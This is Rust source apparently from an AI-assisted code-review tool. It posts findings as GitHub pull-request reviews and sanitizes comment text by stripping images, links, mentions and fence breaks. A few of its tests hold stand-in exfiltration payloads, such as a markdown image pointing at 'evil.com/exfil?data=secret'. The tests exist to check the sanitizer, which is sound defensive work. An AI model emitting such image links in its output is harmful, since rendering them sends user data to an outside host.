use crate::finding::{Finding, Severity, Source};
use crate::hydration::DiffRanges;
use regex::Regex;
use serde::{Deserialize, Serialize};
use std::sync::LazyLock;

const GITHUB_BODY_LIMIT: usize = 60_000;
const REVIEW_BODY_LIMIT: usize = 55_000;

fn truncate_utf8_safe(s: &mut String, max_bytes: usize) {
    if s.len() <= max_bytes {
        return;
    }
    let mut end = max_bytes;
    while end > 0 && !s.is_char_boundary(end) {
        end -= 1;
    }
    s.truncate(end);
}

// Matches @mention not preceded by a word char (e.g. not user@example.com).
// Uses a capturing group with an optional non-word boundary prefix character.
static RE_MENTION: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(^|[^a-zA-Z0-9_.])@([a-zA-Z0-9][-a-zA-Z0-9]*)").unwrap());

// Matches #123 not preceded by a word char or dot (e.g. not docs.md#section).
static RE_ISSUE_REF: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(^|[^a-zA-Z0-9_.])#(\d+)").unwrap());

static RE_MD_IMAGE: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"!\[[^\]]*\]\([^)]*\)").unwrap());

static RE_HTML_IMG: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(?i)<img[^>]*>").unwrap());

static RE_HTML_ANCHOR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?is)<a[^>]*>(.*?)</a>").unwrap());

static RE_BACKTICK_RUN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"(`{3,})").unwrap());

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PostingTarget {
    Inline,
    Body,
}

fn is_line_in_diff_ranges(file_path: &str, line: u32, diff_ranges: &DiffRanges) -> bool {
    for (path, ranges) in diff_ranges {
        if path == file_path {
            return ranges
                .iter()
                .any(|&(start, end)| line >= start && line <= end);
        }
    }
    false
}

pub fn classify_posting_target(
    finding: &Finding,
    file_path: &str,
    diff_ranges: &DiffRanges,
) -> PostingTarget {
    if finding.in_diff != Some(true) {
        return PostingTarget::Body;
    }

    let anchor = finding.anchor_line();
    if !is_line_in_diff_ranges(file_path, anchor, diff_ranges) {
        return PostingTarget::Body;
    }

    // For multiline comments, both ends must be in commentable ranges
    if finding.line_start != finding.line_end
        && !is_line_in_diff_ranges(file_path, finding.line_start, diff_ranges)
    {
        return PostingTarget::Body;
    }

    PostingTarget::Inline
}

pub fn sanitize_for_github(s: &str) -> String {
    // 1. Strip control characters (keep \n, \t)
    let mut out: String = s
        .chars()
        .filter(|c| !c.is_control() || *c == '\n' || *c == '\t')
        .collect();

    // 2. Break backtick runs of 3+ by inserting a zero-width space after the second backtick.
    // This prevents them from being interpreted as fenced code block delimiters.
    out = RE_BACKTICK_RUN
        .replace_all(&out, |caps: &regex::Captures| {
            let ticks = &caps[1];
            // Insert a zero-width space (U+200B) after the 2nd backtick to break the fence.
            format!("``\u{200B}{}", &ticks[2..])
        })
        .into_owned();

    // 3. Strip HTML anchors (keep inner text)
    out = RE_HTML_ANCHOR.replace_all(&out, "$1").into_owned();

    // 4. Strip image tags
    out = RE_MD_IMAGE.replace_all(&out, "").into_owned();
    out = RE_HTML_IMG.replace_all(&out, "").into_owned();

    // 5. Neutralize @mentions (but not emails)
    // Group 1 is the non-word prefix char (or empty at start), group 2 is the username.
    out = RE_MENTION.replace_all(&out, "${1}`@$2`").into_owned();

    // 6. Neutralize #refs (but not URL fragments)
    // Group 1 is the non-word prefix char (or empty at start), group 2 is the number.
    out = RE_ISSUE_REF.replace_all(&out, "${1}`#$2`").into_owned();

    // 7. Truncate
    truncate_utf8_safe(&mut out, GITHUB_BODY_LIMIT);

    out
}

fn severity_icon(sev: &Severity) -> &'static str {
    match sev {
        Severity::Critical | Severity::High => "!",
        Severity::Medium => "~",
        Severity::Low | Severity::Info => "-",
    }
}

fn source_label(source: &Source) -> &str {
    source.provider_name()
}

pub fn render_inline_comment(finding: &Finding, version: &str) -> String {
    let icon = severity_icon(&finding.severity);
    let cat = finding.category.as_str();
    let source = source_label(&finding.source);
    let mut out = format!(
        "**{}** {} — `{}`\n\n{}\n\n*quorum {} | {}*",
        icon,
        sanitize_for_github(&finding.title),
        cat,
        sanitize_for_github(&finding.description),
        version,
        source,
    );
    truncate_utf8_safe(&mut out, GITHUB_BODY_LIMIT);
    out
}

pub fn render_body_finding(finding: &Finding, version: &str) -> String {
    let icon = severity_icon(&finding.severity);
    let cat = finding.category.as_str();
    let line = finding.anchor_line();
    let source = source_label(&finding.source);
    format!(
        "**{}** {} — `{}` L{}\n\n{}\n\n*quorum {} | {}*",
        icon,
        sanitize_for_github(&finding.title),
        cat,
        line,
        sanitize_for_github(&finding.description),
        version,
        source,
    )
}

fn format_summary_counts(inline_count: usize, body_findings: &[Finding]) -> String {
    let total = inline_count + body_findings.len();

    let mut crits = 0u32;
    let mut warns = 0u32;
    let mut infos = 0u32;
    for f in body_findings {
        match f.severity {
            Severity::Critical | Severity::High => crits += 1,
            Severity::Medium => warns += 1,
            Severity::Low | Severity::Info => infos += 1,
        }
    }

    let mut parts = Vec::new();
    if crits > 0 {
        parts.push(format!("{} critical", crits));
    }
    if warns > 0 {
        parts.push(format!("{} warning", warns));
    }
    if infos > 0 {
        parts.push(format!("{} info", infos));
    }

    let sev_summary = if parts.is_empty() {
        String::new()
    } else {
        format!(" ({})", parts.join(", "))
    };

    let location = if body_findings.is_empty() {
        String::new()
    } else {
        format!(
            " | {} inline, {} in summary",
            inline_count,
            body_findings.len()
        )
    };

    format!("{} findings{}{}", total, sev_summary, location)
}

pub fn render_review_body(
    marker: &str,
    inline_count: usize,
    body_findings: &[Finding],
    version: &str,
) -> String {
    use std::fmt::Write;
    let mut out = String::with_capacity(4096);
    writeln!(out, "{}\n", marker).unwrap();

    let total = inline_count + body_findings.len();
    writeln!(out, "## Quorum Review\n").unwrap();

    if total == 0 {
        writeln!(out, "No findings.").unwrap();
        return out;
    }

    let summary = format_summary_counts(inline_count, body_findings);
    writeln!(out, "{}\n", summary).unwrap();

    if body_findings.is_empty() {
        return out;
    }

    writeln!(out, "### Findings outside changed lines\n").unwrap();

    for (rendered_count, f) in body_findings.iter().enumerate() {
        let entry = render_body_finding(f, version);
        if out.len() + entry.len() + 100 > REVIEW_BODY_LIMIT {
            let remaining = body_findings.len() - rendered_count;
            writeln!(
                out,
                "\n... {} additional findings omitted from review body. See CI artifact for full results.",
                remaining
            )
            .unwrap();
            break;
        }
        writeln!(out, "{}\n", entry).unwrap();
    }

    out
}

// --- Task 4: Repo URL parsing and GitHub context resolution ---

pub fn parse_github_repo_url(url: &str) -> Option<(String, String)> {
    // Direct owner/repo format (e.g. from GITHUB_REPOSITORY)
    if !url.contains("://") && !url.contains('@') {
        let parts: Vec<&str> = url.split('/').collect();
        if parts.len() == 2 && !parts[0].is_empty() && !parts[1].is_empty() {
            return Some((parts[0].to_string(), parts[1].to_string()));
        }
    }

    // SSH: git@host:owner/repo.git
    if let Some(colon_part) = url.strip_prefix("git@")
        && let Some(path) = colon_part.split(':').nth(1)
    {
        return parse_owner_repo_from_path(path);
    }

    // SSH URL form: ssh://git@host/owner/repo.git
    if url.starts_with("ssh://") {
        let path = url
            .split("://")
            .nth(1)?
            .split('/')
            .skip(1) // skip user@hostname
            .collect::<Vec<_>>()
            .join("/");
        return parse_owner_repo_from_path(&path);
    }

    // HTTPS: https://host/owner/repo.git
    if url.starts_with("https://") || url.starts_with("http://") {
        let path = url
            .split("://")
            .nth(1)?
            .split('/')
            .skip(1) // skip hostname
            .collect::<Vec<_>>()
            .join("/");
        return parse_owner_repo_from_path(&path);
    }

    None
}

fn parse_owner_repo_from_path(path: &str) -> Option<(String, String)> {
    let clean = path.strip_suffix(".git").unwrap_or(path);
    let parts: Vec<&str> = clean.split('/').collect();
    if parts.len() >= 2 && !parts[0].is_empty() && !parts[1].is_empty() {
        Some((parts[0].to_string(), parts[1].to_string()))
    } else {
        None
    }
}

#[derive(Debug, Clone)]
pub struct GitHubContext {
    pub owner: String,
    pub repo: String,
    pub token: String,
}

#[derive(Debug)]
pub enum GitHubContextError {
    NoToken,
    NoRepo(String),
}

impl std::fmt::Display for GitHubContextError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::NoToken => write!(
                f,
                "No GitHub token found. Set GITHUB_TOKEN or use --github-token"
            ),
            Self::NoRepo(detail) => write!(f, "Could not determine repository: {}", detail),
        }
    }
}

pub fn resolve_github_context(
    token_flag: Option<&str>,
    repo_flag: Option<&str>,
) -> Result<GitHubContext, GitHubContextError> {
    let token = token_flag
        .map(|s| s.to_string())
        .or_else(|| std::env::var("GITHUB_TOKEN").ok())
        .filter(|s| !s.is_empty())
        .ok_or(GitHubContextError::NoToken)?;

    let (owner, repo) = if let Some(r) = repo_flag {
        parse_github_repo_url(r)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("invalid format: {}", r)))?
    } else if let Ok(gh_repo) = std::env::var("GITHUB_REPOSITORY") {
        parse_github_repo_url(&gh_repo)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("GITHUB_REPOSITORY={}", gh_repo)))?
    } else {
        // Try git remote
        let output = std::process::Command::new("git")
            .args(["remote", "get-url", "origin"])
            .output()
            .map_err(|e| GitHubContextError::NoRepo(format!("git remote failed: {}", e)))?;
        if !output.status.success() {
            return Err(GitHubContextError::NoRepo(
                "git remote get-url origin exited with non-zero status".into(),
            ));
        }
        let url = String::from_utf8_lossy(&output.stdout).trim().to_string();
        parse_github_repo_url(&url)
            .ok_or_else(|| GitHubContextError::NoRepo(format!("cannot parse remote: {}", url)))?
    };

    Ok(GitHubContext { owner, repo, token })
}

// --- Task 5: Marker protocol and dismiss logic ---

const MARKER_PREFIX: &str = "quorum-review-marker:v1";

pub fn build_review_marker(run_id: &str, sha: &str, version: &str) -> String {
    format!(
        "<!-- {} run_id={} sha={} version={} -->",
        MARKER_PREFIX, run_id, sha, version
    )
}

pub fn body_contains_quorum_marker(body: &str) -> bool {
    body.contains(MARKER_PREFIX)
}

// --- Task 6: GitHub API client ---

const GITHUB_API_BASE: &str = "https://api.github.com";
const GITHUB_API_VERSION: &str = "2026-03-10";

#[derive(Debug)]
pub enum GitHubReportError {
    Http(reqwest::Error),
    Api { status: u16, message: String },
    NoToken,
    NoRepo(String),
    InvalidFindings(String),
}

impl std::fmt::Display for GitHubReportError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Http(e) => write!(f, "HTTP error: {}", e),
            Self::Api { status, message } => {
                write!(f, "GitHub API error ({}): {}", status, message)
            }
            Self::NoToken => write!(f, "No GitHub token"),
            Self::NoRepo(d) => write!(f, "Cannot determine repo: {}", d),
            Self::InvalidFindings(d) => write!(f, "Invalid findings: {}", d),
        }
    }
}

impl From<reqwest::Error> for GitHubReportError {
    fn from(e: reqwest::Error) -> Self {
        Self::Http(e)
    }
}

pub struct PostReviewRequest {
    pub owner: String,
    pub repo: String,
    pub pr_number: u64,
    pub token: String,
    pub findings: Vec<Finding>,
    pub diff_text: String,
    pub version: String,
    pub run_id: String,
    pub commit_sha: String,
    /// Override API base URL (for testing). Default: https://api.github.com
    pub api_base_url: Option<String>,
}

pub struct PostReviewResult {
    pub review_id: u64,
    pub inline_count: usize,
    pub body_count: usize,
    pub dismissed_previous: Option<u64>,
}

#[derive(Serialize)]
struct CreateReviewRequest {
    commit_id: String,
    event: String,
    body: String,
    comments: Vec<ReviewComment>,
}

#[derive(Serialize)]
struct ReviewComment {
    path: String,
    body: String,
    line: u32,
    side: String,
    #[serde(skip_serializing_if = "Option::is_none")]
    start_line: Option<u32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    start_side: Option<String>,
}

#[derive(Deserialize)]
struct ReviewResponse {
    id: u64,
}

#[derive(Deserialize)]
struct ListReviewEntry {
    id: u64,
    body: Option<String>,
}

#[derive(Serialize)]
struct DismissRequest {
    message: String,
    event: String,
}

fn api_base(req: &PostReviewRequest) -> &str {
    req.api_base_url.as_deref().unwrap_or(GITHUB_API_BASE)
}

fn github_client_headers(token: &str) -> reqwest::header::HeaderMap {
    let mut headers = reqwest::header::HeaderMap::new();
    headers.insert(
        reqwest::header::ACCEPT,
        "application/vnd.github+json".parse().unwrap(),
    );
    headers.insert(
        reqwest::header::AUTHORIZATION,
        format!("Bearer {}", token).parse().unwrap(),
    );
    headers.insert(
        reqwest::header::USER_AGENT,
        format!("quorum/{}", env!("CARGO_PKG_VERSION")).parse().unwrap(),
    );
    headers.insert("X-GitHub-Api-Version", GITHUB_API_VERSION.parse().unwrap());
    headers
}

async fn dismiss_previous_reviews(
    client: &reqwest::Client,
    req: &PostReviewRequest,
) -> Option<u64> {
    let base = api_base(req);
    let url = format!(
        "{}/repos/{}/{}/pulls/{}/reviews",
        base, req.owner, req.repo, req.pr_number
    );
    let headers = github_client_headers(&req.token);
    let resp = match client.get(&url).headers(headers.clone()).send().await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("Warning: failed to list reviews for dismiss: {}", e);
            return None;
        }
    };
    if !resp.status().is_success() {
        eprintln!(
            "Warning: list reviews returned {}: skipping dismiss",
            resp.status()
        );
        return None;
    }
    let reviews: Vec<ListReviewEntry> = match resp.json().await {
        Ok(r) => r,
        Err(e) => {
            eprintln!("Warning: failed to parse review list: {}", e);
            return None;
        }
    };

    let mut dismissed_id = None;
    for review in &reviews {
        if let Some(body) = &review.body
            && body_contains_quorum_marker(body)
        {
            let dismiss_url = format!("{}/{}/dismissals", url, review.id);
            let dismiss_body = DismissRequest {
                message: "Superseded by updated quorum review".into(),
                event: "DISMISS".into(),
            };
            match client
                .put(&dismiss_url)
                .headers(headers.clone())
                .json(&dismiss_body)
                .send()
                .await
            {
                Ok(r) if r.status().is_success() => {
                    dismissed_id = Some(review.id);
                }
                Ok(r) => {
                    eprintln!(
                        "Warning: dismiss review {} returned {}: best-effort, continuing",
                        review.id,
                        r.status()
                    );
                }
                Err(e) => {
                    eprintln!("Warning: dismiss review {} failed: {}", review.id, e);
                }
            }
        }
    }
    dismissed_id
}

pub async fn fetch_pr_diff(
    client: &reqwest::Client,
    owner: &str,
    repo: &str,
    pr_number: u64,
    token: &str,
    api_base_url: Option<&str>,
) -> Result<String, GitHubReportError> {
    let base = api_base_url.unwrap_or(GITHUB_API_BASE);
    let url = format!("{}/repos/{}/{}/pulls/{}", base, owner, repo, pr_number);
    let mut headers = github_client_headers(token);
    headers.insert(
        reqwest::header::ACCEPT,
        "application/vnd.github.diff".parse().unwrap(),
    );
    let resp = client.get(&url).headers(headers).send().await?;
    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }
    Ok(resp.text().await?)
}

pub async fn fetch_pr_head_sha(
    client: &reqwest::Client,
    owner: &str,
    repo: &str,
    pr_number: u64,
    token: &str,
    api_base_url: Option<&str>,
) -> Result<String, GitHubReportError> {
    let base = api_base_url.unwrap_or(GITHUB_API_BASE);
    let url = format!("{}/repos/{}/{}/pulls/{}", base, owner, repo, pr_number);
    let headers = github_client_headers(token);
    let resp = client.get(&url).headers(headers).send().await?;
    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }
    let body: serde_json::Value = resp.json().await?;
    body["head"]["sha"]
        .as_str()
        .map(|s| s.to_string())
        .ok_or_else(|| GitHubReportError::Api {
            status: 200,
            message: "PR response missing head.sha".into(),
        })
}

pub async fn post_review(
    client: &reqwest::Client,
    req: &PostReviewRequest,
) -> Result<PostReviewResult, GitHubReportError> {
    let diff_ranges = crate::hydration::parse_unified_diff(&req.diff_text);
    let marker = build_review_marker(&req.run_id, &req.commit_sha, &req.version);

    // Dismiss previous reviews (best-effort)
    let dismissed_previous = dismiss_previous_reviews(client, req).await;

    // Classify findings
    let mut inline_comments = Vec::new();
    let mut body_findings = Vec::new();

    for finding in &req.findings {
        // Use first evidence entry as file path (populated by the review pipeline)
        let file_path = finding.evidence.first().map(|s| s.as_str()).unwrap_or("");
        let target = classify_posting_target(finding, file_path, &diff_ranges);
        match target {
            PostingTarget::Inline => {
                let body = render_inline_comment(finding, &req.version);
                inline_comments.push(ReviewComment {
                    path: file_path.to_string(),
                    body,
                    line: finding.anchor_line(),
                    side: "RIGHT".into(),
                    start_line: if finding.line_start != finding.line_end {
                        Some(finding.line_start)
                    } else {
                        None
                    },
                    start_side: if finding.line_start != finding.line_end {
                        Some("RIGHT".into())
                    } else {
                        None
                    },
                });
            }
            PostingTarget::Body => {
                body_findings.push(finding.clone());
            }
        }
    }

    let review_body =
        render_review_body(&marker, inline_comments.len(), &body_findings, &req.version);

    let create_req = CreateReviewRequest {
        commit_id: req.commit_sha.clone(),
        event: "COMMENT".into(),
        body: review_body,
        comments: inline_comments,
    };

    let base = api_base(req);
    let url = format!(
        "{}/repos/{}/{}/pulls/{}/reviews",
        base, req.owner, req.repo, req.pr_number
    );
    let headers = github_client_headers(&req.token);
    let resp = client
        .post(&url)
        .headers(headers)
        .json(&create_req)
        .send()
        .await?;

    if !resp.status().is_success() {
        return Err(GitHubReportError::Api {
            status: resp.status().as_u16(),
            message: resp.text().await.unwrap_or_default(),
        });
    }

    let review: ReviewResponse = resp.json().await?;

    Ok(PostReviewResult {
        review_id: review.id,
        inline_count: create_req.comments.len(),
        body_count: body_findings.len(),
        dismissed_previous,
    })
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::category::Category;
    use crate::finding::{Finding, Severity, Source};

    #[test]
    fn render_inline_comment_critical() {
        let f = Finding {
            id: "test".into(),
            title: "SQL injection".into(),
            description: "User input flows to query".into(),
            severity: Severity::Critical,
            category: Category::Security,
            source: Source::Llm("gpt-5.4".into()),
            line_start: 42,
            line_end: 42,
            evidence: vec![],
            calibrator_action: None,
            similar_precedent: vec![],
            canonical_pattern: None,
            suggested_fix: None,
            based_on_excerpt: None,
            reasoning: None,
            llm_confidence: None,
            confidence: None,
            cited_lines: None,
            grounding_status: None,
            grounding_confidence: None,
            model_agreement: None,
            rule_id: None,
            judge_verdict: None,
            judge_confidence: None,
            precision_tier: None,
            in_diff: Some(true),
        };
        let result = render_inline_comment(&f, "0.27.0");
        assert!(result.contains("**!** SQL injection"));
        assert!(result.contains("`security`"));
        assert!(result.contains("User input flows to query"));
        assert!(result.contains("*quorum 0.27.0 | gpt-5.4*"));
    }

    #[test]
    fn render_body_finding_includes_line() {
        let f = Finding {
            id: "test".into(),
            title: "Token not rotated".into(),
            description: "Session fixation risk".into(),
            severity: Severity::Medium,
            category: Category::Security,
            source: Source::LocalAst,
            line_start: 89,
            line_end: 89,
            evidence: vec![],
            calibrator_action: None,
            similar_precedent: vec![],
            canonical_pattern: None,
            suggested_fix: None,
            based_on_excerpt: None,
            reasoning: None,
            llm_confidence: None,
            confidence: None,
            cited_lines: None,
            grounding_status: None,
            grounding_confidence: None,
            model_agreement: None,
            rule_id: None,
            judge_verdict: None,
            judge_confidence: None,
            precision_tier: None,
            in_diff: None,
        };
        let result = render_body_finding(&f, "0.27.0");
        assert!(result.contains("**~** Token not rotated"));
        assert!(result.contains("L89"));
    }

    #[test]
    fn render_review_body_clean() {
        let body = render_review_body("<!-- quorum-review-marker:v1 -->", 0, &[], "0.27.0");
        assert!(body.contains("quorum-review-marker"));
        assert!(body.contains("No findings."));
    }

    #[test]
    fn render_review_body_with_summary() {
        let f = Finding {
            id: "test".into(),
            title: "Issue".into(),
            description: "Desc".into(),
            severity: Severity::High,
            category: Category::Security,
            source: Source::LocalAst,
            line_start: 10,
            line_end: 10,
            evidence: vec![],
            calibrator_action: None,
            similar_precedent: vec![],
            canonical_pattern: None,
            suggested_fix: None,
            based_on_excerpt: None,
            reasoning: None,
            llm_confidence: None,
            confidence: None,
            cited_lines: None,
            grounding_status: None,
            grounding_confidence: None,
            model_agreement: None,
            rule_id: None,
            judge_verdict: None,
            judge_confidence: None,
            precision_tier: None,
            in_diff: None,
        };
        let body = render_review_body("<!-- quorum-review-marker:v1 -->", 2, &[f], "0.27.0");
        assert!(body.contains("## Quorum Review"));
        assert!(body.contains("3 findings"));
        assert!(body.contains("2 inline, 1 in summary"));
        assert!(body.contains("Findings outside changed lines"));
    }

    #[test]
    fn render_review_body_truncates_overflow() {
        let findings: Vec<Finding> = (0..500)
            .map(|i| Finding {
                id: format!("f{i}"),
                title: format!("Finding {i} with a long title that takes space"),
                description: "x".repeat(200),
                severity: Severity::Low,
                category: Category::Maintainability,
                source: Source::LocalAst,
                line_start: i as u32 + 1,
                line_end: i as u32 + 1,
                evidence: vec![],
                calibrator_action: None,
                similar_precedent: vec![],
                canonical_pattern: None,
                suggested_fix: None,
                based_on_excerpt: None,
                reasoning: None,
                llm_confidence: None,
                confidence: None,
                cited_lines: None,
                grounding_status: None,
                grounding_confidence: None,
                model_agreement: None,
                rule_id: None,
                judge_verdict: None,
                judge_confidence: None,
                precision_tier: None,
                in_diff: None,
            })
            .collect();
        let body = render_review_body("<!-- quorum-review-marker:v1 -->", 0, &findings, "0.27.0");
        assert!(body.len() <= 60_000);
        assert!(body.contains("additional findings omitted"));
    }

    #[test]
    fn sanitize_strips_control_chars() {
        assert_eq!(sanitize_for_github("hello\x00world\x07"), "helloworld");
    }

    #[test]
    fn sanitize_preserves_newlines_and_tabs() {
        assert_eq!(sanitize_for_github("line1\nline2\tok"), "line1\nline2\tok");
    }

    #[test]
    fn sanitize_escapes_triple_backticks() {
        let input = "break ```out``` of fence";
        let result = sanitize_for_github(input);
        assert!(!result.contains("```"));
    }

    #[test]
    fn sanitize_neutralizes_at_mentions() {
        assert_eq!(
            sanitize_for_github("ping @admin about this"),
            "ping `@admin` about this"
        );
    }

    #[test]
    fn sanitize_neutralizes_issue_refs() {
        assert_eq!(
            sanitize_for_github("see #123 for details"),
            "see `#123` for details"
        );
    }

    #[test]
    fn sanitize_strips_markdown_images() {
        assert_eq!(
            sanitize_for_github("text ![alt](http://evil.com/exfil?data=secret) more"),
            "text  more"
        );
    }

    #[test]
    fn sanitize_strips_html_img_tags() {
        assert_eq!(
            sanitize_for_github("before <img src=\"http://evil.com\"> after"),
            "before  after"
        );
    }

    #[test]
    fn sanitize_strips_html_anchor_tags() {
        assert_eq!(
            sanitize_for_github("click <a href=\"http://evil.com\">here</a> now"),
            "click here now"
        );
    }

    #[test]
    fn sanitize_truncates_at_limit() {
        let long = "x".repeat(65_000);
        let result = sanitize_for_github(&long);
        assert!(result.len() <= 60_000);
    }

    #[test]
    fn sanitize_truncates_multibyte_safely() {
        // 3-byte UTF-8 chars repeated to exceed limit, should not panic
        let long = "\u{2603}".repeat(25_000); // snowman = 3 bytes each = 75K bytes
        let result = sanitize_for_github(&long);
        assert!(result.len() <= 60_000);
        assert!(result.is_char_boundary(result.len()));
    }

    #[test]
    fn sanitize_no_false_positive_on_email() {
        assert_eq!(
            sanitize_for_github("email user@example.com here"),
            "email user@example.com here"
        );
    }

    #[test]
    fn sanitize_no_false_positive_on_hash_in_url() {
        assert_eq!(
            sanitize_for_github("see docs.md#section"),
            "see docs.md#section"
        );
    }

    fn make_finding(id: &str, line: u32, in_diff: bool) -> Finding {
        Finding {
            id: id.into(),
            title: "Test finding".into(),
            description: "Desc".into(),
            severity: Severity::Medium,
            category: Category::Security,
            source: Source::LocalAst,
            line_start: line,
            line_end: line,
            evidence: vec![],
            calibrator_action: None,
            similar_precedent: vec![],
            canonical_pattern: None,
            suggested_fix: None,
            based_on_excerpt: None,
            reasoning: None,
            llm_confidence: None,
            confidence: None,
            cited_lines: None,
            grounding_status: None,
            grounding_confidence: None,
            model_agreement: None,
            rule_id: None,
            judge_verdict: None,
            judge_confidence: None,
            precision_tier: None,
            in_diff: Some(in_diff),
        }
    }

    #[test]
    fn classify_finding_in_diff_and_commentable() {
        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,5 +40,7 @@\n context\n+added line\n+another\n context\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let f = make_finding("test", 41, true);
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Inline);
    }

    #[test]
    fn classify_finding_in_diff_but_not_commentable() {
        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let f = make_finding("test", 100, true);
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Body);
    }

    #[test]
    fn classify_finding_not_in_diff() {
        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let f = make_finding("test", 41, false);
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Body);
    }

    #[test]
    fn classify_finding_file_not_in_diff() {
        let diff = "--- a/src/other.rs\n+++ b/src/other.rs\n@@ -1,3 +1,5 @@\n+new\n+new\n old\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let f = make_finding("test", 1, true);
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Body);
    }

    #[test]
    fn classify_multiline_both_ends_in_diff() {
        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,5 +40,7 @@\n context\n+added line\n+another\n+third\n context\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let mut f = make_finding("test", 41, true);
        f.line_end = 43;
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Inline);
    }

    #[test]
    fn classify_multiline_start_outside_diff() {
        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";
        let ranges = crate::hydration::parse_unified_diff(diff);
        let mut f = make_finding("test", 42, true);
        f.line_start = 30; // outside diff hunk
        let target = classify_posting_target(&f, "src/auth.rs", &ranges);
        assert_eq!(target, PostingTarget::Body);
    }

    // --- Task 4 tests: URL parsing ---

    #[test]
    fn parse_repo_https() {
        let (owner, repo) = parse_github_repo_url("https://github.com/jsnyder/quorum.git").unwrap();
        assert_eq!(owner, "jsnyder");
        assert_eq!(repo, "quorum");
    }

    #[test]
    fn parse_repo_https_no_dot_git() {
        let (owner, repo) = parse_github_repo_url("https://github.com/jsnyder/quorum").unwrap();
        assert_eq!(owner, "jsnyder");
        assert_eq!(repo, "quorum");
    }

    #[test]
    fn parse_repo_ssh() {
        let (owner, repo) = parse_github_repo_url("git@github.com:jsnyder/quorum.git").unwrap();
        assert_eq!(owner, "jsnyder");
        assert_eq!(repo, "quorum");
    }

    #[test]
    fn parse_repo_slash_format() {
        let (owner, repo) = parse_github_repo_url("jsnyder/quorum").unwrap();
        assert_eq!(owner, "jsnyder");
        assert_eq!(repo, "quorum");
    }

    #[test]
    fn parse_repo_ssh_url() {
        let (owner, repo) =
            parse_github_repo_url("ssh://git@github.com/jsnyder/quorum.git").unwrap();
        assert_eq!(owner, "jsnyder");
        assert_eq!(repo, "quorum");
    }

    #[test]
    fn parse_repo_invalid() {
        assert!(parse_github_repo_url("not-a-repo").is_none());
    }

    #[test]
    fn parse_github_enterprise() {
        let (owner, repo) =
            parse_github_repo_url("https://github.example.com/org/repo.git").unwrap();
        assert_eq!(owner, "org");
        assert_eq!(repo, "repo");
    }

    // --- Task 5 tests: marker protocol ---

    #[test]
    fn build_marker() {
        let m = build_review_marker("01JTEST", "abc1234", "0.27.0");
        assert!(m.starts_with("<!-- quorum-review-marker:v1"));
        assert!(m.contains("run_id=01JTEST"));
        assert!(m.contains("sha=abc1234"));
        assert!(m.contains("version=0.27.0"));
        assert!(m.ends_with("-->"));
    }

    #[test]
    fn find_marker_in_body() {
        let body =
            "Some text\n<!-- quorum-review-marker:v1 run_id=X sha=Y version=0.27.0 -->\nMore text";
        assert!(body_contains_quorum_marker(body));
    }

    #[test]
    fn no_marker_in_body() {
        assert!(!body_contains_quorum_marker("Just a regular review body"));
    }

    #[test]
    fn find_marker_with_extra_whitespace() {
        let body = "<!-- quorum-review-marker:v1  run_id=X  sha=Y  version=0.27.0 -->";
        assert!(body_contains_quorum_marker(body));
    }
}

#[cfg(test)]
mod integration_tests {
    use super::*;
    use std::net::TcpListener;

    #[tokio::test]
    async fn post_review_creates_review_with_inline_comments() {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let base_url = format!("http://127.0.0.1:{}", port);

        // Use a real OS thread so blocking accept() doesn't starve the tokio executor
        let handle = std::thread::spawn(move || {
            // Accept and respond to: list reviews (GET), create review (POST)
            for _ in 0..2 {
                let (mut stream, _) = listener.accept().unwrap();
                use std::io::{Read, Write};
                let mut buf = [0u8; 8192];
                let n = stream.read(&mut buf).unwrap();
                let req_str = String::from_utf8_lossy(&buf[..n]);

                if req_str.starts_with("GET") {
                    let body = "[]";
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nContent-Type: application/json\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    stream.write_all(resp.as_bytes()).unwrap();
                } else {
                    let body = r#"{"id": 42}"#;
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Length: {}\r\nContent-Type: application/json\r\n\r\n{}",
                        body.len(),
                        body
                    );
                    stream.write_all(resp.as_bytes()).unwrap();
                }
            }
        });

        let diff = "--- a/src/auth.rs\n+++ b/src/auth.rs\n@@ -40,3 +40,5 @@\n context\n+added\n+added\n context\n";

        let f = crate::finding::Finding {
            id: "f1".into(),
